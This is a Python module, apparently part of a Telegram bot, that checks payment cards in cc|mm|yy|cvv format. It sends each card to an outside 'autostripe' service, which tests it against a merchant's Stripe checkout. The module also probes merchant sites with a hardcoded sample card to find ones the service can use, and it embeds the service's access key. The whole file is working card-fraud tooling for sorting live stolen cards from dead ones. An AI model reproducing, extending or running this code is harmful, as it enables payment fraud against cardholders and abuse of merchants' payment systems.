# AutoStripe API Module
import httpx
import json

# AutoStripe API Configuration
AUTOSTRIPE_BASE_URL = "https://blackxcard-autostripe.onrender.com"
AUTOSTRIPE_KEY = "Blackxcard"
AUTOSTRIPE_GATEWAY = "autostripe"

async def autostripe_check(site: str, cc: str, session: httpx.AsyncClient = None) -> dict:
    """
    Check card using AutoStripe API
    
    Args:
        site: The site domain to use for checking (e.g., dilaboards.com)
        cc: Card in format cc|mm|yy|cvv
        session: Optional httpx session for connection pooling
    
    Returns:
        dict with response data
    """
    # Build the URL in the format:
    # https://blackxcard-autostripe.onrender.com/gateway=autostripe/key=Blackxcard/site=dilaboards.com/cc=4403934091847371|06|2026|097
    url = f"{AUTOSTRIPE_BASE_URL}/gateway={AUTOSTRIPE_GATEWAY}/key={AUTOSTRIPE_KEY}/site={site}/cc={cc}"
    
    try:
        if session:
            response = await session.get(url)
        else:
            async with httpx.AsyncClient(timeout=120.0) as client:
                response = await client.get(url)
        
        # Try to parse as JSON
        try:
            data = response.json()
            return data
        except:
            # If not JSON, return the text response
            return {"Response": response.text, "raw": True}
            
    except httpx.ReadTimeout:
        return {"Response": "Request Timeout", "error": True}
    except httpx.ConnectError:
        return {"Response": "Connection Failed", "error": True}
    except Exception as e:
        return {"Response": f"Error: {str(e)}", "error": True}


def get_user_site(user_id: str) -> dict | None:
    """Get user's saved site from DATA/sites.json"""
    try:
        with open("DATA/sites.json", "r") as f:
            sites = json.load(f)
        return sites.get(str(user_id))
    except FileNotFoundError:
        return None
    except Exception:
        return None


async def check_card(user_id: str, cc: str, site: str = None) -> str:
    """
    Main function to check a card using AutoStripe
    
    Args:
        user_id: The user's Telegram ID
        cc: Card in format cc|mm|yy|cvv
        site: Optional site override
    
    Returns:
        Response string
    """
    if not site:
        user_site_info = get_user_site(user_id)
        if not user_site_info:
            return "Site Not Found"
        site = user_site_info.get("site")
    
    if not site:
        return "Site Not Found"
    
    # Make the API call
    result = await autostripe_check(site, cc)
    
    if result.get("error"):
        return result.get("Response", "Unknown Error")
    
    # Parse the response
    response_text = str(result.get("Response", result.get("response", result.get("message", str(result)))))
    
    return response_text


async def validate_site(site: str, test_cc: str = "4403934091847371|06|2026|097") -> dict | None:
    """
    Validate if a site is supported by AutoStripe
    
    Args:
        site: Site domain to validate
        test_cc: Test card to use
    
    Returns:
        dict with site info if valid, None otherwise
    """
    try:
        async with httpx.AsyncClient(timeout=60.0) as session:
            result = await autostripe_check(site, test_cc, session)
            
            # Check if the response indicates a valid site
            if result.get("error"):
                return None
            
            # If we got a response (even declined), the site is valid
            response = str(result.get("Response", result.get("response", "")))
            
            # Check for common error patterns that indicate invalid site
            invalid_patterns = [
                "site not found",
                "invalid site",
                "not supported",
                "site error"
            ]
            
            for pattern in invalid_patterns:
                if pattern.lower() in response.lower():
                    return None
            
            # Site is valid, return info
            return {
                "site": site,
                "gate": "AutoStripe",
                "response": response
            }
            
    except Exception as e:
        print(f"Error validating site {site}: {e}")
        return None
